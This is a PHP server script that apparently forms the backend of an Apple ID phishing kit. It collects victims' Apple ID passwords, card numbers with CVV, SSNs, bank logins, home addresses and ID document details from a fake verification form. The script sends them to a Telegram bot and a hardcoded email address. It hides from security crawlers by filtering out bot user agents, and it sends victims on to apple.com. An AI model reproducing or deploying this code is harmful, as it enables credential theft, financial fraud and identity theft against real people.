<?php
// Set headers to handle AJAX requests
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type, X-Requested-With, X-Verification-Token');

// Create upload directory if it doesn't exist
$uploadDir = 'uploads/';
if (!file_exists($uploadDir)) {
    mkdir($uploadDir, 0755, true);
}

// Anti-Bot Protection
function checkForBot($request) {
    // Check if the request has the necessary headers
    if (!isset($_SERVER['HTTP_X_REQUESTED_WITH']) || $_SERVER['HTTP_X_REQUESTED_WITH'] !== 'XMLHttpRequest') {
        return true;
    }
    
    // Check verification token
    if (!isset($_SERVER['HTTP_X_VERIFICATION_TOKEN']) || empty($_SERVER['HTTP_X_VERIFICATION_TOKEN'])) {
        return true;
    }
    
    // Check if verification data is provided
    if (!isset($request['verification']) || empty($request['verification'])) {
        return true;
    }
    
    // Decode verification data
    $verification = json_decode($request['verification'], true);
    
    // Check time spent on page (bots usually submit too quickly)
    if (isset($verification['timeOnPage']) && $verification['timeOnPage'] < 3000) {
        return true;
    }
    
    // Check mouse movements (bots often don't move the mouse)
    if (isset($verification['mouseMoves']) && $verification['mouseMoves'] < 5) {
        return true;
    }
    
    // Check key presses (if applicable fields existed)
    if (isset($verification['keyPresses']) && $verification['keyPresses'] < 10) {
        return true;
    }
    
    // Check for common bot user agents
    $botSignatures = array(
        'bot', 'spider', 'crawl', 'lighthouse', 'slurp', 'phantom', 'headless',
        'selenium', 'puppeteer', 'chrome-lighthouse', 'googlebot', 'yandexbot',
        'bingbot', 'robot', 'curl', 'wget', 'scraper', 'java/', 'python-requests'
    );
    
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    foreach ($botSignatures as $signature) {
        if (strpos($userAgent, $signature) !== false) {
            return true;
        }
    }
    
    return false;
}

// Function to generate new verification token
function generateNewToken($length = 32) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

// Function to send data to Telegram
function sendToTelegram($message) {
    // Replace with your actual bot token and chat ID
    $botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
    $chatId = 'YOUR_CHAT_ID';
    
    // Format message for Telegram
    $formattedMessage = urlencode($message);
    
    // Telegram API URL
    $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text={$formattedMessage}&parse_mode=HTML";
    
    // Send request to Telegram
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

// Function to send photo to Telegram
function sendPhotoToTelegram($photoPath, $caption = '') {
    // Replace with your actual bot token and chat ID
    $botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
    $chatId = 'YOUR_CHAT_ID';
    
    // Format caption for Telegram
    $formattedCaption = urlencode($caption);
    
    // Initialize cURL
    $ch = curl_init();
    
    // Create a CURLFile object
    $cFile = new CURLFile($photoPath);
    
    // Set up the data for the request
    $postFields = array(
        'chat_id' => $chatId,
        'photo' => $cFile,
        'caption' => $caption,
        'parse_mode' => 'HTML'
    );
    
    // Set cURL options
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$botToken/sendPhoto");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    // Execute the request
    $response = curl_exec($ch);
    
    // Close the cURL session
    curl_close($ch);
    
    return $response;
}

// Function to send data to email
function sendToEmail($data) {
    $to = "jokersudo@yandex.com"; // Replace with your email
    $subject = "New Ap2ple Verification Data";
    
    // Prepare the email content
    $message = "New verification data submitted:\n\n";
    foreach ($data as $key => $value) {
        if ($key !== 'verification') {
            $message .= "$key: $value\n";
        }
    }
    
    // Add IP and timestamp
    $message .= "\nIP Address: " . $_SERVER['REMOTE_ADDR'] . "\n";
    $message .= "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    $message .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
    
    // Additional headers
    $headers = "From: apple-verification@your-domain.com\r\n";
    $headers .= "Reply-To: no-reply@your-domain.com\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();
    
    // Send the email
    mail($to, $subject, $message, $headers);
}

// Process the request
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Log the raw request for debugging
    file_put_contents('request_log.txt', date('Y-m-d H:i:s') . ' - ' . print_r($_POST, true) . "\n", FILE_APPEND);
    
    // Verify the request is from a valid source, not a bot
    if (checkForBot($_POST)) {
        // Return normal response to not alert bots, but don't process the data
        $response = array(
            'status' => 'success',
            'token' => $_SERVER['HTTP_X_VERIFICATION_TOKEN'] ?? '',
            'newToken' => generateNewToken()
        );
        echo json_encode($response);
        exit;
    }
    
    // Get step number
    $step = isset($_POST['step']) ? intval($_POST['step']) : 0;
    
    // Collection of data from the form
    $data = array();
    
    // Process based on step
    switch ($step) {
        case 1:
            // Account credentials step
            if (isset($_POST['email']) && isset($_POST['password'])) {
                $data = array(
                    'step' => 'Account Information',
                    'email' => $_POST['email'],
                    'password' => $_POST['password'],
                    'ip' => $_SERVER['REMOTE_ADDR'],
                    'user_agent' => $_SERVER['HTTP_USER_AGENT'],
                    'timestamp' => date('Y-m-d H:i:s')
                );
                
                // Format message for Telegram
                $message = "🔐 <b>Apple ID Data:</b>\n";
                $message .= "📧 <b>Email:</b> " . $_POST['email'] . "\n";
                $message .= "🔑 <b>Password:</b> " . $_POST['password'] . "\n";
                $message .= "🌐 <b>IP:</b> " . $_SERVER['REMOTE_ADDR'] . "\n";
                $message .= "📱 <b>User Agent:</b> " . $_SERVER['HTTP_USER_AGENT'] . "\n";
                $message .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s') . "\n";
                
                // Send data to Telegram and email
                sendToTelegram($message);
                sendToEmail($data);
            }
            break;
            
        case 4:
            // Final submission with all data
            // Get JSON data from form
            $email = isset($_POST['collected-email']) ? $_POST['collected-email'] : '';
            $password = isset($_POST['collected-password']) ? $_POST['collected-password'] : '';
            $cardJson = isset($_POST['collected-card']) ? $_POST['collected-card'] : '{}';
            $personalJson = isset($_POST['collected-personal']) ? $_POST['collected-personal'] : '{}';
            $idJson = isset($_POST['collected-id']) ? $_POST['collected-id'] : '{}';
            
            // Parse JSON data
            $cardData = json_decode($cardJson, true) ?: [];
            $personalData = json_decode($personalJson, true) ?: [];
            $idData = json_decode($idJson, true) ?: [];
            
            // Combine all data
            $data = array(
                'step' => 'Complete Form Submission',
                'email' => $email,
                'password' => $password,
                'ip' => $_SERVER['REMOTE_ADDR'],
                'user_agent' => $_SERVER['HTTP_USER_AGENT'],
                'timestamp' => date('Y-m-d H:i:s')
            );
            
            // Add card data
            if (!empty($cardData)) {
                $data = array_merge($data, [
                    'bank' => $cardData['bank'] ?? '',
                    'card_level' => $cardData['cardLevel'] ?? '',
                    'cardholder' => $cardData['cardholder'] ?? '',
                    'card_number' => $cardData['cardNumber'] ?? '',
                    'expiry' => $cardData['expiry'] ?? '',
                    'cvv' => $cardData['cvv'] ?? '',
                    'amex_cid' => $cardData['amexCID'] ?? '',
                    'ssn' => $cardData['ssn'] ?? '',
                    'credit_limit' => $cardData['creditLimit'] ?? '',
                    'card_password' => $cardData['cardPassword'] ?? ''
                ]);
            }
            
            // Add personal data
            if (!empty($personalData)) {
                $data = array_merge($data, [
                    'firstname' => $personalData['firstName'] ?? '',
                    'lastname' => $personalData['lastName'] ?? '',
                    'address' => $personalData['address'] ?? '',
                    'city' => $personalData['city'] ?? '',
                    'state' => $personalData['state'] ?? '',
                    'country' => $personalData['country'] ?? '',
                    'zipcode' => $personalData['zipcode'] ?? '',
                    'phone' => $personalData['phone'] ?? ''
                ]);
            }
            
            // Add ID data
            if (!empty($idData)) {
                $data = array_merge($data, [
                    'id_type' => $idData['idType'] ?? '',
                    'id_number' => $idData['idNumber'] ?? '',
                    'id_issue_date' => $idData['issueDate'] ?? '',
                    'id_expiry_date' => $idData['expiryDate'] ?? ''
                ]);
            }
            
            // Format complete message for Telegram 
            $message = "#--------------------------------[ LOGIN DETAILS ]-------------------------------#\n";
            $message .= "Apple ID : " . $email . "\n";
            $message .= "Password : " . $password . "\n";
            $message .= "#--------------------------------[ CARD DETAILS ]-------------------------------#\n";
            $message .= "Bank : " . ($cardData['bank'] ?? 'N/A') . "\n";
            $message .= "Level : " . ($cardData['cardLevel'] ?? 'N/A') . "\n";
            $message .= "Cardholders : " . ($cardData['cardholder'] ?? 'N/A') . "\n";
            $message .= "CC Number : " . ($cardData['cardNumber'] ?? 'N/A') . "\n";
            $message .= "Expired : " . ($cardData['expiry'] ?? 'N/A') . "\n";
            $message .= "CVV : " . ($cardData['cvv'] ?? 'N/A') . "\n";
            $message .= "AMEX CID : " . ($cardData['amexCID'] ?? 'N/A') . "\n";
            $message .= "SSN : " . ($cardData['ssn'] ?? 'N/A') . "\n";
            $message .= "Credit Limit : " . ($cardData['creditLimit'] ?? 'N/A') . "\n";
            $message .= "#--------------------------[ = INFO ]-----------------------------#\n";
            $message .= "Bank Username : " . ($cardData['bankUsername'] ?? 'N/A') . "\n";
            $message .= "Bank Password : " . ($cardData['cardPassword'] ?? 'N/A') . "\n";
            $message .= "#-------------------------[ PERSONAL INFORMATION ]--------------------------------#\n";
            $message .= "First Name : " . ($personalData['firstName'] ?? 'N/A') . "\n";
            $message .= "Last Name : " . ($personalData['lastName'] ?? 'N/A') . "\n";
            $message .= "Address : " . ($personalData['address'] ?? 'N/A') . "\n";
            $message .= "City : " . ($personalData['city'] ?? 'N/A') . "\n";
            $message .= "State : " . ($personalData['state'] ?? 'N/A') . "\n";
            $message .= "Country : " . ($personalData['country'] ?? 'N/A') . "\n";
            $message .= "Zip : " . ($personalData['zipcode'] ?? 'N/A') . "\n";
            $message .= "Phone : " . ($personalData['phone'] ?? 'N/A') . "\n";
            $message .= "#------------------------[ ID INFORMATION ]------------------------------#\n";
            $message .= "ID Type : " . ($idData['idType'] ?? 'N/A') . "\n";
            $message .= "ID Number : " . ($idData['idNumber'] ?? 'N/A') . "\n";
            $message .= "Issue Date : " . ($idData['issueDate'] ?? 'N/A') . "\n";
            $message .= "Expiry Date : " . ($idData['expiryDate'] ?? 'N/A') . "\n";
            $message .= "#------------------------[ DEVICE INFORMATION ]------------------------------#\n";
            $message .= "IP Address : " . $_SERVER['REMOTE_ADDR'] . "\n";
            $message .= "User Agent : " . $_SERVER['HTTP_USER_AGENT'] . "\n";
            $message .= "Date/Time : " . date('Y-m-d H:i:s') . "\n";
            
            // Send data to Telegram and email
            sendToTelegram($message);
            sendToEmail($data);
            
            // Log completion
            file_put_contents('completed_submissions.txt', date('Y-m-d H:i:s') . ' - ' . $email . ' - ' . $_SERVER['REMOTE_ADDR'] . "\n", FILE_APPEND);
            break;
    }
    
    // Return success response
    $response = array(
        'status' => 'success',
        'redirect' => 'https://www.apple.com',
        'newToken' => generateNewToken()
    );
    
    echo json_encode($response);
} else {
    // Not a POST request - redirect to avoid direct access
    header('Location: https://www.apple.com');
    exit;
}
?>
